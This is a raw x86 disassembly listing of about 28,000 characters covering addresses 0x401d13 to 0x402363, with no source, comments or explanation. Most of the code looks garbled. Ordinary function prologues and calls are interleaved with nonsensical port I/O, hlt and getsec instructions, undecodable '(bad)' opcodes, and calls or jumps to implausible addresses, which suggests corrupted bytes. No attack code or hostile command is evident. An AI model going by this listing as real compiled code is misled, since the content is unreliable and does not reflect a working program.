  401d13:	0f bf c7             	movswl %di,%eax
  401d16:	ec                   	in     (%dx),%al
  401d17:	68 98 d2 40 00       	push   $0x40d298
  401d1c:	e8 1f df 00 00       	call   0x40fc40
  401d21:	83 68 10 c7          	subl   $0xffffffc7,0x10(%eax)
  401d25:	46                   	inc    %esi
  401d26:	08 00                	or     %al,(%eax)
  401d28:	4b                   	dec    %ebx
  401d29:	00 00                	add    %al,(%eax)
  401d2b:	d3 63 c7             	shll   %cl,-0x39(%ebx)
  401d2e:	46                   	inc    %esi
  401d2f:	08 02                	or     %al,(%edx)
  401d31:	d3 00                	roll   %cl,(%eax)
  401d33:	20 8b 47 a8 a4 41    	and    %cl,0x41a4a847(%ebx)
  401d39:	00 42 89             	add    %al,-0x77(%edx)
  401d3c:	15 d6 02 41 06       	adc    $0x64102d6,%eax
  401d41:	56                   	push   %esi
  401d42:	e8 59 01 3f 00       	call   0x7f1ea0
  401d47:	83 c4 04             	add    $0x4,%esp
  401d4a:	83 7e 08 03          	cmpl   $0x3,0x8(%esi)
  401d4e:	75 49                	jne    0x401d99
  401d50:	35 4e 94 b8 01       	xor    $0x1b8944e,%eax
  401d55:	00 62 00             	add    %ah,0x0(%edx)
  401d58:	30 45 d8             	xor    %al,-0x28(%ebp)
  401d5b:	66 89 45 dc          	mov    %ax,-0x24(%ebp)
  401d5f:	a1 f8 17 41 13       	mov    0x134117f8,%eax
  401d64:	8d 4f d4             	lea    -0x2c(%edi),%ecx
  401d67:	52                   	push   %edx
  401d68:	50                   	push   %eax
  401d69:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401d6c:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  401d6f:	0c 4c                	or     $0x4c,%al
  401d71:	43                   	inc    %ebx
  401d72:	00 00                	add    %al,(%eax)
  401d74:	eb 2a                	jmp    0x401da0
  401d76:	8b 3d b8 34 41 00    	mov    0x4134b8,%edi
  401d7c:	8b c0                	mov    %eax,%eax
  401d7e:	e5 02                	in     $0x2,%eax
  401d80:	41                   	inc    %ecx
  401d81:	00 c8                	add    %cl,%al
  401d83:	42                   	inc    %edx
  401d84:	89 34 b8             	mov    %esi,(%eax,%edi,4)
  401d87:	02 41 00             	add    0x0(%ecx),%al
  401d8a:	89 15 cc 02 41 00    	mov    %edx,0x4102cc
  401d90:	56                   	push   %esi
  401d91:	21 ca                	and    %ecx,%edx
  401d93:	1a 00                	sbb    (%eax),%al
  401d95:	00 83 c4 04 8b 45    	add    %al,0x458b04c4(%ebx)
  401d9b:	f4                   	hlt
  401d9c:	8b 55 08             	mov    0x8(%ebp),%edx
  401d9f:	8b 4d 47             	mov    0x47(%ebp),%ecx
  401da2:	40                   	inc    %eax
  401da3:	83 c2 14             	add    $0x14,%edx
  401da6:	3b bc 89 45 f4 f1 55 	cmp    0x55f1f445(%ecx,%ecx,4),%edi
  401dad:	f8                   	clc
  401dae:	0f 8c a8 fe ff ff    	jl     0x401c5c
  401db4:	96                   	xchg   %eax,%esi
  401db5:	0d 55 0b 41 00       	or     $0x410b55,%eax
  401dba:	8b 45 6b             	mov    0x6b(%ebp),%eax
  401dbd:	e9 c8 a1 ac 02       	jmp    0x2ecbf8a
  401dc2:	41                   	inc    %ecx
  401dc3:	ec                   	in     (%dx),%al
  401dc4:	7f 1b                	jg     0x401de1
  401dc6:	7c 0d                	jl     0x401dd5
  401dc8:	8b fe                	mov    %esi,%edi
  401dca:	a0 0b 41 00 8b       	mov    0x8b00410b,%al
  401dcf:	4d                   	dec    %ebp
  401dd0:	ec                   	in     (%dx),%al
  401dd1:	3b d1                	cmp    %ecx,%edx
  401dd3:	73 0c                	jae    0x401de1
  401dd5:	3b 05 53 d0 40 00    	cmp    0x40d053,%eax
  401ddb:	0f 8c 12 fe a6 ff    	jl     0xffe71bf3
  401de1:	8b 0d 14 d0 6b 00    	mov    0x6bd014,%ecx
  401de7:	85 c9                	test   %ecx,%ecx
  401de9:	74 1a                	je     0x401e05
  401deb:	c4 a1 c8 c0 40 00    	les    0x40c0c8(%ecx),%esp
  401df1:	83 c0 db             	add    $0xffffffdb,%eax
  401df4:	e9 80 d2 40 00       	jmp    0x80f079
  401df9:	50                   	push   %eax
  401dfa:	ff 15 80 e1 40 00    	call   *0x40e180
  401e00:	83 c4 0c             	add    $0xc,%esp
  401e03:	eb 0e                	jmp    0x401e13
  401e05:	dc 78 90             	fdivrl -0x70(%eax)
  401e08:	81 00 ff 15 64 c1    	addl   $0xc16415ff,(%eax)
  401e0e:	40                   	inc    %eax
  401e0f:	00 a8 dc 04 a1 88    	add    %ch,-0x775efb24(%eax)
  401e15:	02 4c 00 85          	add    -0x7b(%eax,%eax,1),%cl
  401e19:	0e                   	push   %cs
  401e1a:	74 0c                	je     0x401e28
  401e1c:	e8 92 ad 00 a7       	call   0xa740cbb3
  401e21:	5f                   	pop    %edi
  401e22:	2f                   	das
  401e23:	dd 8b 98 5d c3 6a    	fisttpll 0x6ac35d98(%ebx)
  401e29:	2b e8                	sub    %eax,%ebp
  401e2b:	31 02                	xor    %eax,(%edx)
  401e2d:	00 a5 83 c4 04 5f    	add    %ah,0x5f04c483(%ebp)
  401e33:	5e                   	pop    %esi
  401e34:	5b                   	pop    %ebx
  401e35:	0b 7f 5d             	or     0x5d(%edi),%edi
  401e38:	c3                   	ret
  401e39:	90                   	nop
  401e3a:	90                   	nop
  401e3b:	90                   	nop
  401e3c:	41                   	inc    %ecx
  401e3d:	90                   	nop
  401e3e:	90                   	nop
  401e3f:	90                   	nop
  401e40:	55                   	push   %ebp
  401e41:	5b                   	pop    %ebx
  401e42:	59                   	pop    %ecx
  401e43:	83 ec 8d             	sub    $0xffffff8d,%esp
  401e46:	56                   	push   %esi
  401e47:	8b 75 0c             	mov    0xc(%ebp),%esi
  401e4a:	a9 c6 2c 88 6a       	test   $0x6a882cc6,%eax
  401e4f:	78 50                	js     0x401ea1
  401e51:	56                   	push   %esi
  401e52:	e8 89 68 00 00       	call   0x4086e0
  401e57:	8b 4d 6e             	mov    0x6e(%ebp),%ecx
  401e5a:	2e 15 c8 c0 40 00    	cs adc $0x40c0c8,%eax
  401e60:	50                   	push   %eax
  401e61:	98                   	cwtl
  401e62:	3f                   	aas
  401e63:	c2 40 e0             	ret    $0xe040
  401e66:	ac                   	lods   %ds:(%esi),%al
  401e67:	d4 40                	aam    $0x40
  401e69:	00 52 ff             	add    %dl,-0x1(%edx)
  401e6c:	15 80 0e 40 00       	adc    $0x400e80,%eax
  401e71:	a1 ac 02 41 00       	mov    0x4102ac,%eax
  401e76:	83 c4 14             	add    $0x14,%esp
  401e79:	85 c0                	test   %eax,%eax
  401e7b:	06                   	push   %es
  401e7c:	0f f4 68 54          	pmuludq 0x54(%eax),%mm5
  401e80:	d2 62 00             	shlb   %cl,0x0(%edx)
  401e83:	ff 15 64 c1 40 52    	call   *0x5240c164
  401e89:	83 c4 08             	add    $0x8,%esp
  401e8c:	ed                   	in     (%dx),%eax
  401e8d:	cb                   	lret
  401e8e:	15 70 c1 40 00       	adc    $0x40c170,%eax
  401e93:	5e                   	pop    %esi
  401e94:	90                   	nop
  401e95:	90                   	nop
  401e96:	90                   	nop
  401e97:	90                   	nop
  401e98:	fb                   	sti
  401e99:	08 90 90 90 90 90    	or     %dl,-0x6f6f6f70(%eax)
  401e9f:	f8                   	clc
  401ea0:	55                   	push   %ebp
  401ea1:	8b ec                	mov    %esp,%ebp
  401ea3:	da 80 14 18 56 98    	fiaddl -0x67a9e7ec(%eax)
  401ea9:	75 da                	jne    0x401e85
  401eab:	57                   	push   %edi
  401eac:	8b 46 14             	mov    0x14(%esi),%eax
  401eaf:	89 db                	mov    %ebx,%ebx
  401eb1:	25 e8 49 4b 00       	and    $0x4b49e8,%eax
  401eb6:	00 a3 b5 0b 41 00    	add    %ah,0x410bb5(%ebx)
  401ebc:	89 aa ed 0b 41 00    	mov    %ebp,0x410bed(%edx)
  401ec2:	8b d8                	mov    %eax,%ebx
  401ec4:	8b 46 14             	mov    0x14(%esi),%eax
  401ec7:	33 5f 8b             	xor    -0x75(%edi),%ebx
  401eca:	fa                   	cli
  401ecb:	d3 6d 8b             	shrl   %cl,-0x75(%ebp)
  401ece:	4e                   	dec    %esi
  401ecf:	63 6a 00             	arpl   %ebp,0x0(%edx)
  401ed2:	6e                   	outsb  %ds:(%esi),(%dx)
  401ed3:	00 51 e8             	add    %dl,-0x18(%ecx)
  401ed6:	96                   	xchg   %eax,%esi
  401ed7:	08 00                	or     %al,(%eax)
  401ed9:	00 89 9e 89 53 00    	add    %cl,0x53899e(%ecx)
  401edf:	00 e7                	add    %ah,%bh
  401ee1:	5f                   	pop    %edi
  401ee2:	3c 08                	cmp    $0x8,%al
  401ee4:	00 00                	add    %al,(%eax)
  401ee6:	c7                   	(bad)
  401ee7:	d8 29                	fsubrs (%ecx)
  401ee9:	00 00                	add    %al,(%eax)
  401eeb:	00 00                	add    %al,(%eax)
  401eed:	98                   	cwtl
  401eee:	15 90 17 41 00       	adc    $0x411790,%eax
  401ef3:	89 56 14             	mov    %edx,0x14(%esi)
  401ef6:	a1 60 02 41 6a       	mov    0x6a410260,%eax
  401efb:	9b                   	fwait
  401efc:	c0 74 3b a1 70       	shlb   $0x70,-0x5f(%ebx,%edi,1)
  401f01:	02 41 00             	add    0x0(%ecx),%al
  401f04:	04 ca                	add    $0xca,%al
  401f06:	da c8                	fcmove %st(0),%st
  401f08:	89 4e 14             	mov    %ecx,0x14(%esi)
  401f0b:	eb 2d                	jmp    0x401f3a
  401f0d:	8b d3                	mov    %ebx,%edx
  401f0f:	38 08                	cmp    %cl,(%eax)
  401f11:	00 00                	add    %al,(%eax)
  401f13:	a1 28 cf 40 4d       	mov    0x4d40cf28,%eax
  401f18:	7f 15                	jg     0x401f2f
  401f1a:	2c d0                	sub    $0xd0,%al
  401f1c:	40                   	inc    %eax
  401f1d:	84 c0                	test   %al,%al
  401f1f:	c8 8b 86 86          	enter  $0x868b,$0x86
  401f23:	08 3b                	or     %bh,(%ebx)
  401f25:	00 13                	add    %dl,(%ebx)
  401f27:	93                   	xchg   %eax,%ebx
  401f28:	0e                   	push   %cs
  401f29:	f8                   	clc
  401f2a:	0f 8f e5 4a 00 47    	jg     0x47406a15
  401f30:	7c 08                	jl     0x401f3a
  401f32:	78 d9                	js     0x401f0d
  401f34:	0f 87 db 00 00 ba    	ja     0xba402015
  401f3a:	8b 56 18             	mov    0x18(%esi),%edx
  401f3d:	8b 4e 9c             	mov    -0x64(%esi),%ecx
  401f40:	d0 40 00             	rolb   $1,0x0(%eax)
  401f43:	8b 46 04             	mov    0x4(%esi),%eax
  401f46:	8d 13                	lea    (%ebx),%edx
  401f48:	e6 03                	out    %al,$0x3
  401f4a:	c9                   	leave
  401f4b:	4b                   	dec    %ebx
  401f4c:	52                   	push   %edx
  401f4d:	50                   	push   %eax
  401f4e:	e8 c6 4c 00 00       	call   0x406c19
  401f53:	85 c0                	test   %eax,%eax
  401f55:	74 33                	je     0x401f8a
  401f57:	83 f8 0b             	cmp    $0xb,%eax
  401f5a:	ec                   	in     (%dx),%al
  401f5b:	2e 3d 68 f0 0a 00    	cs cmp $0xaf068,%eax
  401f61:	74 fc                	je     0x401f5f
  401f63:	3d d9 cf 0a 60       	cmp    $0x600acfd9,%eax
  401f68:	74 20                	je     0x401f8a
  401f6a:	3d 26 fd 0a 00       	cmp    $0xafd26,%eax
  401f6f:	74 19                	je     0x401f8a
  401f71:	de 24 3c             	fisubs (%esp,%edi,1)
  401f74:	0a 00                	or     (%eax),%al
  401f76:	13 3e                	adc    (%esi),%edi
  401f78:	3d a1 12 0a 00       	cmp    $0xa12a1,%eax
  401f7d:	4f                   	dec    %edi
  401f7e:	0b d2                	or     %edx,%edx
  401f80:	b3 23                	mov    $0x23,%bl
  401f82:	41                   	inc    %ecx
  401f83:	00 0f                	add    %cl,(%edi)
  401f85:	85 a6 00 00 9d 8b    	test   %esp,-0x74630000(%esi)
  401f8b:	45                   	inc    %ebp
  401f8c:	29 8b 1d a0 20 41    	sub    %ecx,0x4120a01d(%ebx)
  401f92:	00 8b 38 89 02 41    	add    %cl,0x41028938(%ebx)
  401f98:	7f 03                	jg     0x401f9d
  401f9a:	d8 83 d7 00 89 1d    	fadds  0x1d8900d7(%ebx)
  401fa0:	a0 02 41 00 89       	mov    0x89004102,%al
  401fa5:	3d a4 fc 1b 00       	cmp    $0x1bfca4,%eax
  401faa:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401fab:	56                   	push   %esi
  401fac:	18 4d 0b             	sbb    %cl,0xb(%ebp)
  401faf:	14 03                	adc    $0x3,%al
  401fb1:	d0 2b                	shrb   $1,(%ebx)
  401fb3:	c8 89 56 18          	enter  $0x5689,$0x18
  401fb7:	89 4e 8f             	mov    %ecx,-0x71(%esi)
  401fba:	0f 37                	getsec
  401fbc:	ec                   	in     (%dx),%al
  401fbd:	fe                   	(bad)
  401fbe:	ff a2 c7 46 b2 03    	jmp    *0x3b246c7(%edx)
  401fc4:	e6 73                	out    %al,$0x73
  401fc6:	00 e8                	add    %ch,%al
  401fc8:	3e 51                	ds push %ecx
  401fca:	00 00                	add    %al,(%eax)
  401fcc:	a3 a0 0b 41 00       	mov    %eax,0x410ba0
  401fd1:	89 15 fb 0b 33 00    	mov    %edx,0x330bfb
  401fd7:	8b 56 04             	mov    0x4(%esi),%edx
  401fda:	89 86 40 e6 00 5e    	mov    %eax,0x5e00e640(%esi)
  401fe0:	8b 0d a4 0b 41 64    	mov    0x64410ba4,%ecx
  401fe6:	b8 01 a7 ce bf       	mov    $0xbfcea701,%eax
  401feb:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401fee:	66 5c                	pop    %sp
  401ff0:	45                   	inc    %ebp
  401ff1:	f4                   	hlt
  401ff2:	89 8e aa 08 00 00    	mov    %ecx,0x8aa(%esi)
  401ff8:	8b 0d f8 17 41 00    	mov    0x4117f8,%ecx
  401ffe:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402001:	89 55 f8             	mov    %edx,-0x8(%ebp)
  402004:	66 51                	push   %cx
  402006:	89 75 fc             	mov    %esi,-0x4(%ebp)
  402009:	e8 94 40 34 00       	call   0x7460a2
  40200e:	5f                   	pop    %edi
  40200f:	5e                   	pop    %esi
  402010:	5b                   	pop    %ebx
  402011:	4e                   	dec    %esi
  402012:	e5 5d                	in     $0x5d,%eax
  402014:	c3                   	ret
  402015:	2c d4                	sub    $0xd4,%al
  402017:	d4 f6                	aam    $0xf6
  402019:	fd                   	std
  40201a:	ff 15 64 c1 8b 00    	call   *0x8bc164
  402020:	1b e8                	sbb    %eax,%ebp
  402022:	6a 1a                	push   $0x1a
  402024:	00 00                	add    %al,(%eax)
  402026:	41                   	inc    %ecx
  402027:	2f                   	das
  402028:	08 5f 5e             	or     %bl,0x5e(%edi)
  40202b:	5b                   	pop    %ebx
  40202c:	8b e5                	mov    %ebp,%esp
  40202e:	5d                   	pop    %ebp
  40202f:	16                   	push   %ss
  402030:	8b eb                	mov    %ebx,%ebp
  402032:	bb 02 41 00 68       	mov    $0x68004102,%ebx
  402037:	bc d4 0e 00 43       	mov    $0x43000ed4,%esp
  40203c:	89 1d fd 02 41 00    	mov    %ebx,0x4102fd
  402042:	c6                   	(bad)
  402043:	15 64 c1 40 00       	adc    $0x40c164,%eax
  402048:	56                   	push   %esi
  402049:	e8 42 1a 00 00       	call   0x403a90
  40204e:	83 c4 08             	add    $0x8,%esp
  402051:	5f                   	pop    %edi
  402052:	6c                   	insb   (%dx),%es:(%edi)
  402053:	5b                   	pop    %ebx
  402054:	8b e5                	mov    %ebp,%esp
  402056:	5d                   	pop    %ebp
  402057:	c3                   	ret
  402058:	aa                   	stos   %al,%es:(%edi)
  402059:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40205a:	90                   	nop
  40205b:	90                   	nop
  40205c:	90                   	nop
  40205d:	90                   	nop
  40205e:	90                   	nop
  40205f:	90                   	nop
  402060:	de 8b f4 81 ec f3    	fimuls -0xc137e0c(%ebx)
  402066:	00 00                	add    %al,(%eax)
  402068:	00 8b 45 08 85 c0    	add    %cl,-0x3f7af7bb(%ebx)
  40206e:	e4 12                	in     $0x12,%al
  402070:	e8 8b 49 00 00       	call   0x406a00
  402075:	a3 a0 8b 1c 00       	mov    %eax,0x1c8ba0
  40207a:	89 15 a4 a1 41 00    	mov    %edx,0x41a1a4
  402080:	eb 0b                	jmp    0x40208d
  402082:	72 c2                	jb     0x402046
  402084:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402085:	0b 41 00             	or     0x0(%ecx),%eax
  402088:	a1 a0 66 41 00       	mov    0x4166a0,%eax
  40208d:	d2 8b 1d c0 0b 72    	rorb   %cl,0x720bc01d(%ebx)
  402093:	2b 56 57             	sub    0x57(%esi),%edx
  402096:	8b 3d 92 0b 00 00    	mov    0xb92,%edi
  40209c:	2b c3                	sub    %ebx,%eax
  40209e:	c5 f2 46             	(bad)
  4020a1:	45                   	inc    %ebp
  4020a2:	d8 89 20 dc 8b 35    	fmuls  0x358bdc20(%ecx)
  4020a8:	64 c1 40 00 df       	roll   $0xdf,%fs:0x0(%eax)
  4020ad:	6d                   	insl   (%dx),%es:(%edi)
  4020ae:	d8 38                	fdivrs (%eax)
  4020b0:	df df                	(bad)
  4020b2:	40                   	inc    %eax
  4020b3:	f1                   	int1
  4020b4:	dc 0d 38 c2 40 bf    	fmull  0xbf40c238
  4020ba:	dd 5d d0             	fstpl  -0x30(%ebp)
  4020bd:	3c d6                	cmp    $0xd6,%al
  4020bf:	68 e0 13 41 00       	push   $0x4113e0
  4020c4:	25 6b df 40 e0       	and    $0xe040df6b,%eax
  4020c9:	ff c7                	inc    %edi
  4020cb:	c5 00                	lds    (%eax),%eax
  4020cd:	18 41 00             	sbb    %al,0x0(%ecx)
  4020d0:	50                   	push   %eax
  4020d1:	68 7c a7 40 00       	push   $0x40a77c
  4020d6:	70 d6                	jo     0x4020ae
  4020d8:	33 c9                	xor    %ecx,%ecx
  4020da:	66 8b 0d f4 17 3a 00 	mov    0x3a17f4,%cx
  4020e1:	51                   	push   %ecx
  4020e2:	68 5c df 40 00       	push   $0x40df5c
  4020e7:	b1 d6                	mov    $0xd6,%cl
  4020e9:	68 80 d4 40 b0       	push   $0xb040d480
  4020ee:	8d                   	lea    (bad),%edx
  4020ef:	d6                   	salc
  4020f0:	8b 15 e4 17 41 fd    	mov    0xfd4117e4,%edx
  4020f6:	ff 68 40             	ljmp   *0x40(%eax)
  4020f9:	51                   	push   %ecx
  4020fa:	40                   	inc    %eax
  4020fb:	00 ff                	add    %bh,%bh
  4020fd:	d6                   	salc
  4020fe:	a1 8c 02 41 17       	mov    0x1741028c,%eax
  402103:	50                   	push   %eax
  402104:	5d                   	pop    %ebp
  402105:	1c df                	sbb    $0xdf,%al
  402107:	40                   	inc    %eax
  402108:	7c ff                	jl     0x402109
  40210a:	d6                   	salc
  40210b:	68 80 d4 ba be       	push   $0xbebad480
  402110:	ff d6                	call   *%esi
  402112:	06                   	push   %es
  402113:	0d 18 36 40 00       	or     $0x403618,%eax
  402118:	ac                   	lods   %ds:(%esi),%al
  402119:	68 fc df 40 0e       	push   $0xe40dffc
  40211e:	ff d6                	call   *%esi
  402120:	af                   	scas   %es:(%edi),%eax
  402121:	55                   	push   %ebp
  402122:	d4 10                	aam    $0x10
  402124:	95                   	xchg   %eax,%ebp
  402125:	d0 52 50             	rclb   $1,0x50(%edx)
  402128:	68 a6 de 83 fa       	push   $0xfa83dea6
  40212d:	ff d6                	call   *%esi
  40212f:	8b 0d ac 08 41 00    	mov    0x4108ac,%ecx
  402135:	e6 c4                	out    %al,$0xc4
  402137:	48                   	dec    %eax
  402138:	51                   	push   %ecx
  402139:	68 bc de 24 00       	push   $0x24debc
  40213e:	cf                   	iret
  40213f:	d6                   	salc
  402140:	8b a3 b8 e9 41 19    	mov    0x1941e9b8(%ebx),%esp
  402146:	52                   	push   %edx
  402147:	68 a0 de 40 00       	push   $0x40dea0
  40214c:	ff 43 28             	incl   0x28(%ebx)
  40214f:	b8 02 41 00 83       	mov    $0x83004102,%eax
  402154:	c4 10                	les    (%eax),%edx
  402156:	85 c0                	test   %eax,%eax
  402158:	74 24                	je     0x40217e
  40215a:	a1 cc 11 41 00       	mov    0x4111cc,%eax
  40215f:	8b 0d 6c f6 41 00    	mov    0x41f66c,%ecx
  402165:	43                   	inc    %ebx
  402166:	15 c8 b9 41 00       	adc    $0x41b9c8,%eax
  40216b:	50                   	push   %eax
  40216c:	fe c4                	inc    %ah
  40216e:	02 41 00             	add    0x0(%ecx),%al
  402171:	51                   	push   %ecx
  402172:	52                   	push   %edx
  402173:	50                   	push   %eax
  402174:	68 02 de 63 00       	push   $0x63de02
  402179:	ff d6                	call   *%esi
  40217b:	39 3e                	cmp    %edi,(%esi)
  40217d:	14 8b                	adc    $0x8b,%al
  40217f:	0d bc 02 41 00       	or     $0x4102bc,%eax
  402184:	b5 68                	mov    $0x68,%ch
  402186:	48                   	dec    %eax
  402187:	de 40 00             	fiadds 0x0(%eax)
  40218a:	ff d6                	call   *%esi
  40218c:	e8 07 02 41 55       	call   0x55812398
  402191:	f5                   	cmc
  402192:	c4 08                	les    (%eax),%ecx
  402194:	85 c0                	test   %eax,%eax
  402196:	74 0b                	je     0x4021a3
  402198:	50                   	push   %eax
  402199:	09 2c de             	or     %ebp,(%esi,%ebx,8)
  40219c:	40                   	inc    %eax
  40219d:	00 ff                	add    %bh,%bh
  40219f:	d6                   	salc
  4021a0:	83 e7 08             	and    $0x8,%edi
  4021a3:	a0 30 c0 41 00       	mov    0x41c030,%al
  4021a8:	85 af 74 11 8b 98    	test   %ebp,-0x6774ee8c(%edi)
  4021ae:	b0 32                	mov    $0x32,%al
  4021b0:	41                   	inc    %ecx
  4021b1:	8b 52 68             	mov    0x68(%edx),%edx
  4021b4:	10 de                	adc    %bl,%dh
  4021b6:	7b 00                	jnp    0x4021b8
  4021b8:	ff d6                	call   *%esi
  4021ba:	83 c4 08             	add    $0x8,%esp
  4021bd:	a1 94 ce 41 00       	mov    0x41ce94,%eax
  4021c2:	8b 0d a2 02 41 c5    	mov    0xc54102a2,%ecx
  4021c8:	50                   	push   %eax
  4021c9:	51                   	push   %ecx
  4021ca:	68 e8 dd 79 00       	push   $0x79dde8
  4021cf:	ff 8a 37 60 02 41    	decl   0x41026037(%edx)
  4021d5:	00 83 d9 ca 5b f8    	add    %al,-0x7a43527(%ebx)
  4021db:	01 75 17             	add    %esi,0x17(%ebp)
  4021de:	8b 15 a4 02 41 00    	mov    0x4102a4,%edx
  4021e4:	a1 a0 17 3a b9       	mov    0xb93a17a0,%eax
  4021e9:	93                   	xchg   %eax,%ebx
  4021ea:	50                   	push   %eax
  4021eb:	68 c8 dd 40 00       	push   $0x40ddc8
  4021f0:	ff 36                	push   (%esi)
  4021f2:	83 c4 45             	add    $0x45,%esp
  4021f5:	83 3d 60 ba 41 00 02 	cmpl   $0x2,0x41ba60
  4021fc:	75 18                	jne    0x402216
  4021fe:	8b 0d 26 02 41 00    	mov    0x410226,%ecx
  402204:	8b 15 a0 02 41 00    	mov    0x4102a0,%edx
  40220a:	51                   	push   %ecx
  40220b:	52                   	push   %edx
  40220c:	66 a8 49             	data16 test $0x49,%al
  40220f:	40                   	inc    %eax
  402210:	60                   	pusha
  402211:	ff d6                	call   *%esi
  402213:	20 b0 d1 a1 9c 02    	and    %dh,0x29ca1d1(%eax)
  402219:	41                   	inc    %ecx
  40221a:	00 8b 48 98 55 41    	add    %cl,0x41559848(%ebx)
  402220:	00 50 ba             	add    %dl,-0x46(%eax)
  402223:	d4 80                	aam    $0x80
  402225:	dd e1                	fucom  %st(1)
  402227:	00 ff                	add    %bh,%bh
  402229:	d6                   	salc
  40222a:	dd 45 d0             	fldl   -0x30(%ebp)
  40222d:	dc 4e 30             	fmull  0x30(%esi)
  402230:	c2 40 00             	ret    $0x40
  402233:	83 12 0c             	adcl   $0xc,(%edx)
  402236:	df a2 f6 11 44 0f    	fbld   0xf4411f6(%edx)
  40223c:	8b ee                	mov    %esi,%ebp
  40223e:	00 00                	add    %al,(%eax)
  402240:	cf                   	iret
  402241:	53                   	push   %ebx
  402242:	ac                   	lods   %ds:(%esi),%al
  402243:	02 41 00             	add    0x0(%ecx),%al
  402246:	85 c0                	test   %eax,%eax
  402248:	f0 84 77 0e          	lock test %dh,0xe(%edi)
  40224c:	00 6d dd             	add    %ch,-0x23(%ebp)
  40224f:	05 49 c2 40 00       	add    $0x40c249,%eax
  402254:	dc 75 d0             	fdivl  -0x30(%ebp)
  402257:	b0 ec                	mov    $0xec,%al
  402259:	08 dd                	or     %bl,%ch
  40225b:	5d                   	pop    %ebp
  40225c:	5b                   	pop    %ebx
  40225d:	b5 79                	mov    $0x79,%ch
  40225f:	ac                   	lods   %ds:(%esi),%al
  402260:	02 fd                	add    %ch,%bh
  402262:	75 9d                	jne    0x402201
  402264:	4d                   	dec    %ebp
  402265:	80 d2 34             	adc    $0x34,%dl
  402268:	f9                   	stc
  402269:	68 50 dd 12 ab       	push   $0xab12dd50
  40226e:	ff d6                	call   *%esi
  402270:	db 05 18 d0 40 00    	fildl  0x40d018
  402276:	83 14 04 dc          	adcl   $0xffffffdc,(%esp,%eax,1)
  40227a:	4d                   	dec    %ebp
  40227b:	d0 dc                	rcr    $1,%ah
  40227d:	0d a0 c2 40 58       	or     $0x5840c2a0,%eax
  402282:	57                   	push   %edi
  402283:	35 ec 80 41 00       	xor    $0x4180ec,%eax
  402288:	5d                   	pop    %ebp
  402289:	cf                   	iret
  40228a:	24 87                	and    $0x87,%al
  40228c:	1b dd                	sbb    %ebp,%ebx
  40228e:	40                   	inc    %eax
  40228f:	00 ff                	add    %bh,%bh
  402291:	d9 dd                	(bad)
  402293:	45                   	inc    %ebp
  402294:	d0 dc                	rcr    $1,%ah
  402296:	14 20                	adc    $0x20,%al
  402298:	c2 40 c8             	ret    $0xc840
  40229b:	83 c4 04             	add    $0x4,%esp
  40229e:	43                   	inc    %ebx
  40229f:	35 ac 02 41 00       	xor    $0x4102ac,%eax
  4022a4:	dd 1c c7             	fstpl  (%edi,%eax,8)
  4022a7:	68 95 dc 40 00       	push   $0x40dc95
  4022ac:	13 d6                	adc    %esi,%edx
  4022ae:	df 2d 59 02 41 00    	fildll 0x410259
  4022b4:	d8 47 04             	fadds  0x4(%edi)
  4022b7:	dc 4d 80             	fmull  -0x80(%ebp)
  4022ba:	f5                   	cmc
  4022bb:	0d d6 45 e3 00       	or     $0xe345d6,%eax
  4022c0:	dd 1c 24             	fstpl  (%esp)
  4022c3:	8b a4 b2 40 00 ff d6 	mov    -0x2900ffc0(%edx,%esi,4),%esp
  4022ca:	a1 60 02 41 9f       	mov    0x9f410260,%eax
  4022cf:	83 c4 f1             	add    $0xfffffff1,%esp
  4022d2:	85 c0                	test   %eax,%eax
  4022d4:	7e 59                	jle    0x40232f
  4022d6:	2f                   	das
  4022d7:	2d ea 02 41 4d       	sub    $0x4d4102ea,%eax
  4022dc:	83 ec 08             	sub    $0x8,%esp
  4022df:	31 4d 1a             	xor    %ecx,0x1a(%ebp)
  4022e2:	dc d0                	(bad)
  4022e4:	18 05 40 e9 dd 1c    	sbb    %al,0x1cdde940
  4022ea:	24 b1                	and    $0xb1,%al
  4022ec:	7c dc                	jl     0x4022ca
  4022ee:	40                   	inc    %eax
  4022ef:	00 ff                	add    %bh,%bh
  4022f1:	d6                   	salc
  4022f2:	8b 15 a0 02 41 00    	mov    0x4102a0,%edx
  4022f8:	40                   	inc    %eax
  4022f9:	1d 90 02 41 70       	sbb    $0x70410290,%eax
  4022fe:	a1 a4 02 41 00       	mov    0x4102a4,%eax
  402303:	e1 3d                	loope  0x402342
  402305:	94                   	xchg   %eax,%esp
  402306:	14 5a                	adc    $0x5a,%al
  402308:	00 03                	add    %al,(%ebx)
  40230a:	73 13                	jae    0x40231f
  40230c:	c7                   	(bad)
  40230d:	89 55 d8             	mov    %edx,-0x28(%ebp)
  402310:	89 86 dc 83 05 04    	mov    %eax,0x40583dc(%esi)
  402316:	df 6d 1a             	fildll 0x1a(%ebp)
  402319:	dc 4d 80             	fmull  -0x80(%ebp)
  40231c:	dc 4d 18             	fmull  0x18(%ebp)
  40231f:	c2 40 00             	ret    $0x40
  402322:	dd 1c ef             	fstpl  (%edi,%ebp,8)
  402325:	68 50 62 40 50       	push   $0x50406250
  40232a:	ff 61 83             	jmp    *-0x7d(%ecx)
  40232d:	c4 0c a1             	les    (%ecx,%eiz,4),%ecx
  402330:	ac                   	lods   %ds:(%esi),%al
  402331:	9d                   	popf
  402332:	03 00                	add    (%eax),%eax
  402334:	9d                   	popf
  402335:	c0 0f 8e             	rorb   $0x8e,(%edi)
  402338:	89 0d 00 00 33 c9    	mov    %ecx,0xc9330000
  40233e:	c0 cf ff             	ror    $0xff,%bh
  402341:	ba ff ff ff 7f       	mov    $0x7fffffff,%edx
  402346:	3b ad 89 4d c0 74    	cmp    0x74c04d89(%ebp),%ebp
  40234c:	4d                   	dec    %ebp
  40234d:	e1 89                	loope  0x4022d8
  40234f:	4d                   	dec    %ebp
  402350:	86 3b                	xchg   %bh,(%ebx)
  402352:	2b c7                	sub    %edi,%eax
  402354:	89 4d b7             	mov    %ecx,-0x49(%ebp)
  402357:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40235a:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40235d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40235e:	4d                   	dec    %ebp
  40235f:	ec                   	in     (%dx),%al
  402360:	89 2c b0             	mov    %ebp,(%eax,%esi,4)
  402363:	89 31                	mov    %esi,(%ecx)
